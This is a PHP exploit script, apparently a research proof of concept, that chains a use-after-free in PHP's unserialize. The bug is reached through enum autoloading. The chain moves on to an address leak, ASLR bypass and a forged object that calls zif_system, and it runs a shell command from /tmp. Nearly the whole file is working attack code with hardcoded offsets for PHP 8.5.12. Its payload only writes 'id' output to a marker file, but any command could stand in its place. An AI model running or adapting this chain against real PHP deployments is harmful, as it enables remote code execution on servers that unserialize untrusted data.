<?php
// fa_enum_rce.php — MISSION 2: full zero4 RCE chain entered through the
// ENUM-AUTOLOAD context sharing (shape5_e_boundary entry) instead of the
// O: dup-key trigger.
//
// Entry: outer unserialize contains E:11:"Missing:Foo" -> class lookup
// fires the autoloader -> the autoloader's re-entrant unserialize pushes
// past VAR_ENTRIES_MAX (1018) into the SHARED BG(unserialize) context
// (chained entries block allocated) -> outer var_destroy frees the chained
// block FIRST, then the dtor walk releases the inner-array pin ->
// Stage1::__destruct fires MID-WALK on the orphaned context -> the full
// pwn_zero4 chain (M1 dance leak -> M2 oracle -> M3 forge -> zif_system).
//
// Same classes as fa_cli_core (Stage1/FIRE verbatim, plain2 8.5.12 offsets:
// zend_empty_array=0xffe460 zif_system=0x523c60).
//
// usage: php -n fa_enum_rce.php [attempts]   (plain2 8.5.12)

$ATTEMPTS = (int) ($argv[1] ?? 5);
$MARKER = '/tmp/fa_enum_rce';

class D { public static string $dp = ''; public static string $fp = ''; }
class E {
	public static int $OFF_EMPTY = 0xffe460;
	public static int $OFF_ZIF   = 0x523c60;
	public static int $block2 = 0;
	public static int $base = 0;
}

function fadiag(string $s, string $m): void {
	file_put_contents('/tmp/fa_enum_diag.log', $s, FILE_APPEND);
	echo $s;
	flush();
}

class Stage1 {
	public function __destruct() {
		$MARKER = $GLOBALS['MARKER'];
		$arr = unserialize(D::$dp);
		$blk = $arr[129] ?? null;
		if ($blk === 5 || !is_int($blk) || $blk < 0x10000) {
			fadiag("DANCE-MISS (attempt skipped)\n", $MARKER); return;
		}
		$block2 = $blk - 5056;
		fadiag('M1 block2 = 0x' . dechex($block2) . "\n", $MARKER);

		$u2 = unserialize('a:0:{}');
		$u3 = unserialize('a:0:{}');
		$u4 = unserialize('a:0:{}');
		$u5 = unserialize('a:0:{}');
		$vm5 = 0; $i = -1;
		foreach ($arr as $k => $v) { $i++; if ($i === 1) { $vm5 = (int)$v; } }
		if ($vm5 < 0x10000) { fadiag("LEAK-MISS T_u5\n", $MARKER); return; }

		$u6 = unserialize('a:0:{}');
		$u7 = unserialize('a:0:{}');
		$u8 = unserialize('a:0:{}');
		$u9 = unserialize('a:0:{}');
		$vs = ''; $i = -1;
		foreach ($arr as $k => $v) { $i++; if ($i === 2) { $vs = $v; } }

		$u10 = unserialize('a:0:{}');
		$len_s = strlen($vs);

		$u11 = unserialize('a:0:{}');
		$u12 = unserialize('a:0:{}');
		$u13 = unserialize('a:0:{}');
		$vm13 = 0; $i = -1;
		foreach ($arr as $k => $v) { $i++; if ($i === 3) { $vm13 = (int)$v; } }

		$u14 = unserialize('a:0:{}');
		$u15 = unserialize('a:0:{}');
		$u16 = unserialize('a:0:{}');
		$u17 = unserialize('a:0:{}');
		$vs2 = ''; $i = -1;
		foreach ($arr as $k => $v) { $i++; if ($i === 4) { $vs2 = $v; } }
		$u18 = unserialize('a:0:{}');
		$len_s2 = strlen($vs2);

		fadiag('M2 T_u5=0x' . dechex($vm5) . ' T_u13=0x' . dechex($vm13) .
			' spacing=' . ($vm13 - $vm5) . "\n", $MARKER);
		fadiag('M2 ORACLE1=0x' . dechex($len_s) . ' ORACLE2=0x' . dechex($len_s2) . "\n", $MARKER);

		if ($vm13 - $vm5 !== 128)          { fadiag("M2-BAIL slot spacing\n", $MARKER); return; }
		if ($len_s !== $len_s2)            { fadiag("M2-BAIL oracle mismatch\n", $MARKER); return; }
		if (($len_s & 0xfff) !== (E::$OFF_EMPTY & 0xfff)) {
			fadiag("M2-BAIL oracle lo12\n", $MARKER); return;
		}
		$base = $len_s - E::$OFF_EMPTY;
		if (($base & 0xfff) !== 0)         { fadiag("M2-BAIL base misaligned\n", $MARKER); return; }

		E::$block2 = $block2;
		E::$base   = $base;
		fadiag('M2-DONE base=0x' . dechex($base) .
			' zif_system=0x' . dechex($base + E::$OFF_ZIF) . "\n", $MARKER);

		unset($arr);
		unserialize(D::$fp);
	}
}

class FIRE {
	public function __destruct() {
		$MARKER = $GLOBALS['MARKER'];
		$block2 = E::$block2; $base = E::$base;
		if (!$block2 || !$base) { fadiag("FIRE-BAIL no statics\n", $MARKER); return; }
		$ZIF = $base + E::$OFF_ZIF;

		$V = function ($off) use ($block2) { return $block2 + 24 + $off; };
		$OBJ = $V(128); $HT = $V(600); $CE = $V(1600); $SMINI = $V(224);

		$MAGIC1 = 0x4142434445464748;
		$MAGIC2 = 0x1122334455667788;

		$pat  = pack('P', $V(32));
		$pat .= pack('P', $V(48));
		$pat .= pack('P', $V(64));
		$pat .= pack('P', $V(112));
		$pat .= pack('PVV', $V(80), 6, 0);
		$pat .= pack('PVV', $V(88), 6, 0);
		$pat .= pack('PVV', $OBJ, 0x108, 0);
		$pat .= str_repeat("\x00", 16);
		$pat .= pack('P', $MAGIC1);
		$pat .= pack('P', $MAGIC2);
		$pat .= pack('PVV', $base - 16, 6, 0);
		$pat .= pack('VV', 1, 0x208);
		$pat .= pack('VV', 0, 0);
		$pat .= pack('P', $CE);
		$pat .= pack('P', $HT);
		$pat .= pack('P', 0);
		$pat .= pack('P', 0x0000000100000000);
		$pat .= str_repeat("\x00", 32);
		$pat .= pack('PVV', $SMINI, 6, 0);
		// SMINI @224: "sh /tmp/fa_enum_cmd" = 19 bytes (+NUL)
		$pat .= pack('VV', 1, 0x16);
		$pat .= pack('P', 0);
		$pat .= pack('P', 19);
		$pat .= "sh /tmp/fa_enum_cmd\x00";
		$pat .= str_repeat("\x00", 600 - 268);
		$pat .= pack('VV', 0, 0);
		$pat .= pack('P', 0);
		$pat .= pack('P', $ZIF);                  // +16 dtor_obj
		$pat .= str_repeat("\x00", 136 - 24);
		$pat .= pack('P', $ZIF);                  // +136 get_class_name
		$pat .= str_repeat("\x00", 160 - 144);
		$pat .= pack('P', $ZIF);                  // +160 get_debug_info
		$pat .= str_repeat("\x00", 208 - 168);
		$pat .= str_repeat("\x00", 1600 - 808);
		$pat .= str_repeat("\x00", 2040 - 1600);

		$s = str_repeat($pat, 4);
		fadiag('M3-STR strlen=' . strlen($s) . "\n", $MARKER);

		$c1z = unserialize('R:1020;');
		$c2z = unserialize('R:1021;');
		$c1 = strlen($c1z); $c2 = strlen($c2z);
		if ($c1 !== $MAGIC1 || $c2 !== $MAGIC2) {
			fadiag('RECLAIM-MISS c1=0x' . dechex($c1) . ' c2=0x' . dechex($c2) . "\n", $MARKER);
			return;
		}
		fadiag("M3 string reclaim OK (canaries verified at block2)\n", $MARKER);

		$c3z = unserialize('R:1023;');
		$c3 = strlen($c3z);
		if (($c3 & 0x00FFFFFFFFFFFFFF) !== 0x00010102464c457f) {
			fadiag('M3-BAIL base ELF-magic mismatch: 0x' . dechex($c3) . "\n", $MARKER);
			return;
		}
		fadiag("M3 BASE verified via ELF magic at BASE+0\n", $MARKER);

		$r1 = unserialize('R:1022;');
		fadiag('M3 forged: OBJ=0x' . dechex($OBJ) . ' zif_system=0x' . dechex($ZIF) . "\n", $MARKER);
		fadiag("TRIGGER var_dump -> zif_system(fake_execute_data)\n", $MARKER);
		var_dump($r1);
		fadiag("SURVIVED-CALL\n", $MARKER);
	}
}

// dance payload (verbatim)
$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2*$m+4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256*$j) . ';R:1;'; }
$d .= 'i:16896;i:1;';
D::$dp = 'a:127:{' . $d . '}';
D::$fp = 'O:4:"FIRE":0:{}';

$MARKER = $GLOBALS['MARKER'] = $MARKER;

@unlink($MARKER);
@unlink('/tmp/fa_enum_diag.log');
file_put_contents('/tmp/fa_enum_cmd', 'id > ' . $MARKER . " 2>&1\n");

// ---- the enum-autoload entry (shape5_e_boundary geometry) ----
$n = 1013;  // inner fillers: total pushes = n + 6 = 1019 > 1018 boundary
spl_autoload_register(function ($c) use ($n) {
	$inner = 'a:' . ($n + 1) . ':{i:0;O:6:"Stage1":0:{}';
	for ($i = 1; $i <= $n; $i++) { $inner .= 'i:' . $i . ';i:' . $i . ';'; }
	$inner .= '}';
	$x = unserialize($inner);
	unset($x);                     // slot-only pin remains
	eval('enum ' . $c . ' { case Foo; }');
});

$trigger = 'a:3:{i:0;E:11:"Missing:Foo";i:1;i:1;i:2;i:2;}';

for ($try = 1; $try <= $ATTEMPTS; $try++) {
	echo "=== attempt $try (E: enum-autoload entry) ===\n";
	$r = unserialize($trigger);
	echo 'outer ok=', var_export($r !== false, true), "\n";
	if (is_file($MARKER)) { break; }
}

if (is_file($MARKER)) {
	echo 'MARKER: ', trim(file_get_contents($MARKER)), "\n";
	echo "[PASS] MISSION 2: enum-autoload UAF escalated to full RCE (in-band, ASLR on)\n";
} else {
	echo "[FAIL] marker missing\n";
}
echo "SCRIPT-END\n";
